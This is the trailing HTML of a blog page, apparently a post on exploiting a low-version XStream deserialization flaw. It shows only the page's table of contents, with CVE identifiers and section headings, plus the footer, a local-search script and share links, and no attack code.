+              <a href="/2022/05/02/java%E5%AE%89%E5%85%A8%E6%BC%AB%E8%B0%88%E8%A7%82%E5%90%8E%E6%84%9F(%E5%8D%81%E4%BA%8C)-%E6%97%A0CC%E7%9A%84CB1%E7%AF%87/" target="_self">
+                <i class="iconfont icon-chevronleft"></i>
+                <span>Prev</span>
+              </a>
+            
+          </div>
+          <div class="post-attach">
+            <span class="post-pubtime">
+              <i class="iconfont icon-updatetime" title="Update time"></i>
+              2022-05-03 23:54:19
+            </span>
+            
+          </div>
+          <div class="post-foot-prev">
+            
+          </div>
+        </div>
+      
+    </div>
+    
+  <div id="btn-catalog" class="btn-catalog">
+    <i class="iconfont icon-catalog"></i>
+  </div>
+  <div class="post-catalog hidden" id="catalog">
+    <div class="title">Contents</div>
+    <div class="catalog-content">
+      <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-text">前言</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%8D%E5%87%BA%E7%BD%91%E7%94%A8%E7%9A%84CVE"><span class="toc-text">不出网用的CVE</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%B3%BB%E7%BB%9F%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C"><span class="toc-text">系统命令执行</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#CVE-2013-7285"><span class="toc-text">CVE-2013-7285</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#CVE-2020-26217"><span class="toc-text">CVE-2020-26217</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#CVE-2021-39144"><span class="toc-text">CVE-2021-39144</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#CVE-2021-21345"><span class="toc-text">CVE-2021-21345</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C"><span class="toc-text">代码执行</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ServiceFinder-LazyIterator"><span class="toc-text">ServiceFinder$LazyIterator</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#CVE-2021-21350"><span class="toc-text">CVE-2021-21350</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#CVE-2021-39149"><span class="toc-text">CVE-2021-39149</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#CVE-2021-39153"><span class="toc-text">CVE-2021-39153</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#CVE-2021-39139"><span class="toc-text">CVE-2021-39139</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E7%94%A8ysoserial%E7%9A%84gadget%E6%89%93xstream%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-text">用ysoserial的gadget打xstream反序列化</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%94%9F%E6%88%90ysoserial%E7%9A%84gadget"><span class="toc-text">生成ysoserial的gadget</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AE%9E%E6%93%8D"><span class="toc-text">实操</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%A2%9E%E5%8A%A0gadget"><span class="toc-text">增加gadget</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%95%88%E6%9E%9C"><span class="toc-text">效果</span></a></li></ol></li></ol>
+    </div>
+  </div>
+
+  
+<script src="/js/catalog.js"></script>
+
+
+
+
+    
+      <div class="comments-container">
+        
+
+
+
+
+
+
+
+      </div>
+    
+  </div>
+
+
+        
+<div class="footer">
+  <div class="social">
+    <ul>
+      
+        <li>
+          <a title="github" target="_blank" rel="noopener" href="https://github.com/daidaitiehanhan">
+            <i class="iconfont icon-github"></i>
+          </a>
+        </li>
+      
+    </ul>
+  </div>
+  
+    
+    <div class="footer-more">
+      
+        <a target="_blank" rel="noopener" href="https://daidaitiehanhan.github.io/">Copyright © 2022 tiehanhan</a>
+        
+    </div>
+  
+    
+    <div class="footer-more">
+      
+        <a target="_blank" rel="noopener" href="https://daidaitiehanhan.github.io/">Theme by tiehanhan | Powered by tiehanhan</a>
+        
+    </div>
+  
+</div>
+
+      </div>
+
+      <div class="tools-bar">
+        <div class="back-to-top tools-bar-item hidden">
+  <a href="javascript: void(0)">
+    <i class="iconfont icon-chevronup"></i>
+  </a>
+</div>
+
+
+<script src="/js/backtotop.js"></script>
+
+
+
+        
+  <div class="search-icon tools-bar-item" id="search-icon">
+    <a href="javascript: void(0)">
+      <i class="iconfont icon-search"></i>
+    </a>
+  </div>
+
+  <div class="search-overlay hidden">
+    <div class="search-content" tabindex="0">
+      <div class="search-title">
+        <span class="search-icon-input">
+          <a href="javascript: void(0)">
+            <i class="iconfont icon-search"></i>
+          </a>
+        </span>
+        
+          <input type="text" class="search-input" id="search-input" placeholder="Search...">
+        
+        <span class="search-close-icon" id="search-close-icon">
+          <a href="javascript: void(0)">
+            <i class="iconfont icon-close"></i>
+          </a>
+        </span>
+      </div>
+      <div class="search-result" id="search-result"></div>
+    </div>
+  </div>
+
+  <script type="text/javascript">
+    var inputArea = document.querySelector("#search-input")
+    var searchOverlayArea = document.querySelector(".search-overlay")
+
+    inputArea.onclick = function() {
+      getSearchFile()
+      this.onclick = null
+    }
+
+    inputArea.onkeydown = function() {
+      if(event.keyCode == 13)
+        return false
+    }
+
+    function openOrHideSearchContent() {
+      let isHidden = searchOverlayArea.classList.contains('hidden')
+      if (isHidden) {
+        searchOverlayArea.classList.remove('hidden')
+        document.body.classList.add('hidden')
+        // inputArea.focus()
+      } else {
+        searchOverlayArea.classList.add('hidden')
+        document.body.classList.remove('hidden')
+      }
+    }
+
+    function blurSearchContent(e) {
+      if (e.target === searchOverlayArea) {
+        openOrHideSearchContent()
+      }
+    }
+
+    document.querySelector("#search-icon").addEventListener("click", openOrHideSearchContent, false)
+    document.querySelector("#search-close-icon").addEventListener("click", openOrHideSearchContent, false)
+    searchOverlayArea.addEventListener("click", blurSearchContent, false)
+
+    var searchFunc = function (path, search_id, content_id) {
+      'use strict';
+      var $input = document.getElementById(search_id);
+      var $resultContent = document.getElementById(content_id);
+      $resultContent.innerHTML = "<ul><span class='local-search-empty'>First search, index file loading, please wait...<span></ul>";
+      $.ajax({
+        // 0x01. load xml file
+        url: path,
+        dataType: "xml",
+        success: function (xmlResponse) {
+          // 0x02. parse xml file
+          var datas = $("entry", xmlResponse).map(function () {
+            return {
+              title: $("title", this).text(),
+              content: $("content", this).text(),
+              url: $("url", this).text()
+            };
+          }).get();
+          $resultContent.innerHTML = "";
+
+          $input.addEventListener('input', function () {
+            // 0x03. parse query to keywords list
+            var str = '<ul class=\"search-result-list\">';
+            var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
+            $resultContent.innerHTML = "";
+            if (this.value.trim().length <= 0) {
+              return;
+            }
+            // 0x04. perform local searching
+            datas.forEach(function (data) {
+              var isMatch = true;
+              var content_index = [];
+              if (!data.title || data.title.trim() === '') {
+                data.title = "Untitled";
+              }
+              var orig_data_title = data.title.trim();
+              var data_title = orig_data_title.toLowerCase();
+              var orig_data_content = data.content.trim().replace(/<[^>]+>/g, "");
+              var data_content = orig_data_content.toLowerCase();
+              var data_url = data.url;
+              var index_title = -1;
+              var index_content = -1;
+              var first_occur = -1;
+              // only match artiles with not empty contents
+              if (data_content !== '') {
+                keywords.forEach(function (keyword, i) {
+                  index_title = data_title.indexOf(keyword);
+                  index_content = data_content.indexOf(keyword);
+
+                  if (index_title < 0 && index_content < 0) {
+                    isMatch = false;
+                  } else {
+                    if (index_content < 0) {
+                      index_content = 0;
+                    }
+                    if (i == 0) {
+                      first_occur = index_content;
+                    }
+                    // content_index.push({index_content:index_content, keyword_len:keyword_len});
+                  }
+                });
+              } else {
+                isMatch = false;
+              }
+              // 0x05. show search results
+              if (isMatch) {
+                str += "<li><a href='" + data_url + "' class='search-result-title'>" + orig_data_title + "</a>";
+                var content = orig_data_content;
+                if (first_occur >= 0) {
+                  // cut out 100 characters
+                  var start = first_occur - 20;
+                  var end = first_occur + 80;
+
+                  if (start < 0) {
+                    start = 0;
+                  }
+
+                  if (start == 0) {
+                    end = 100;
+                  }
+
+                  if (end > content.length) {
+                    end = content.length;
+                  }
+
+                  var match_content = content.substr(start, end);
+
+                  // highlight all keywords
+                  keywords.forEach(function (keyword) {
+                    var regS = new RegExp(keyword, "gi");
+                    match_content = match_content.replace(regS, "<span class=\"search-keyword\">" + keyword + "</span>");
+                  });
+
+                  str += "<p class=\"search-result-abstract\">" + match_content + "...</p>"
+                }
+                str += "</li>";
+              }
+            });
+            str += "</ul>";
+            if (str.indexOf('<li>') === -1) {
+              return $resultContent.innerHTML = "<ul><span class='local-search-empty'>No result<span></ul>";
+            }
+            $resultContent.innerHTML = str;
+          });
+        },
+        error: function(xhr, status, error) {
+          $resultContent.innerHTML = ""
+          if (xhr.status === 404) {
+            $resultContent.innerHTML = "<ul><span class='local-search-empty'>The search.xml file was not found, please refer to：<a href='https://github.com/zchengsite/hexo-theme-oranges#configuration' target='_black'>configuration</a><span></ul>";
+          } else {
+            $resultContent.innerHTML = "<ul><span class='local-search-empty'>The request failed, Try to refresh the page or try again later.<span></ul>";
+          }
+        }
+      });
+      $(document).on('click', '#search-close-icon', function() {
+        $('#search-input').val('');
+        $('#search-result').html('');
+      });
+    }
+
+    var getSearchFile = function() {
+        var path = "/search.xml";
+        searchFunc(path, 'search-input', 'search-result');
+    }
+  </script>
+
+
+
+
+        
+  <div class="tools-bar-item theme-icon" id="switch-color-scheme">
+    <a href="javascript: void(0)">
+      <i id="theme-icon" class="iconfont icon-moon"></i>
+    </a>
+  </div>
+
+  
+<script src="/js/colorscheme.js"></script>
+
+
+
+
+
+        
+  
+    <div class="share-icon tools-bar-item">
+      <a href="javascript: void(0)" id="share-icon">
+        <i class="iconfont iconshare"></i>
+      </a>
+      <div class="share-content hidden">
+        
+          <a class="share-item" href="https://twitter.com/intent/tweet?text=' + %E4%B8%80%E6%AC%A1%E4%BD%8E%E7%89%88%E6%9C%ACxstream%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E8%AE%B0%E5%BD%95 + '&url=' + http%3A%2F%2Fexample.com%2F2022%2F05%2F03%2F%25E4%25B8%2580%25E6%25AC%25A1%25E4%25BD%258E%25E7%2589%2588%25E6%259C%25ACxstream%25E5%258F%258D%25E5%25BA%258F%25E5%2588%2597%25E5%258C%2596%25E5%2588%25A9%25E7%2594%25A8%25E8%25AE%25B0%25E5%25BD%2595%2F + '" target="_blank" title="Twitter">
+            <i class="iconfont icon-twitter"></i>
+          </a>
+        
+        
+          <a class="share-item" href="https://www.facebook.com/sharer.php?u=http://example.com/2022/05/03/%E4%B8%80%E6%AC%A1%E4%BD%8E%E7%89%88%E6%9C%ACxstream%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E8%AE%B0%E5%BD%95/" target="_blank" title="Facebook">
+            <i class="iconfont icon-facebooksquare"></i>
+          </a>
+        
+      </div>
+    </div>
+  
+  
+<script src="/js/shares.js"></script>
+
+
+
+      </div>
+    </div>
+  <script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"model":{"jsonPath":"/live2dw/assets/koharu.model.json"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":false},"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
+</html>
+<script type="text/javascript" src="/js/FunnyTitle.js"></script>
+<!-- 页面点击小红心 -->
+<script type="text/javascript" src="/js/love.js"></script>
